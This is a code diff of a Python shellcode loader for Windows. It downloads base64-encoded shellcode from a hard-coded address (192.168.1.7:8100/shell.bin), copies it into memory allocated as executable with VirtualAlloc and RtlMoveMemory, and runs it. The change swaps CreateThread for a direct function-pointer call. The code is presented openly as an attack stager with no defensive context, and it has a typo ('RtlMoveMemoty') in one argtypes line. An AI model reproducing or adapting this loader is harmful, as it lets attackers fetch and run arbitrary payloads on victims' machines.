@@ -10,30 +10,29 @@ def get_code(url):
         shellcode = base64.decodebytes(response.read())
     return shellcode
 
-def write_memory(shellcode):
-    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
-                                          ctypes.c_int(len(shellcode)),
-                                          ctypes.c_int(0x3000),
-                                          ctypes.c_int(0x40))
- 
-    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
- 
-    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
-                                        buf,
-                                        ctypes.c_int(len(shellcode)))
- 
-    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
-                                         ctypes.c_int(0),
-                                         ctypes.c_int(ptr),
-                                         ctypes.c_int(0),
-                                         ctypes.c_int(0),
-                                         ctypes.pointer(ctypes.c_int(0)))
- 
-    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
+def write_memory(buf):
+    length = len(buf)
+
+    kernel32.VirtualAlloc.restype = ctypes.c_void_p
+    kernel32.RtlMoveMemoty.argtypes = (
+        ctypes.c_void_p,
+        ctypes.c_void_p,
+        ctypes.c_size_t
+    )
+
+    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
+    kernel32.RtlMoveMemory(ptr, buf, length)
+    return ptr
 
 def run(shellcode):
-    write_memory(shellcode)
+    buffer = ctypes.create_string_buffer(shellcode)
+
+    ptr = write_memory(buffer)
+
+    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
+    shell_func()
+
 if __name__ == "__main__":
-    url = "http://192.168.1.7:8100/shell.exe"
+    url = "http://192.168.1.7:8100/shell.bin"
     shellcode = get_code(url)
     run(shellcode)
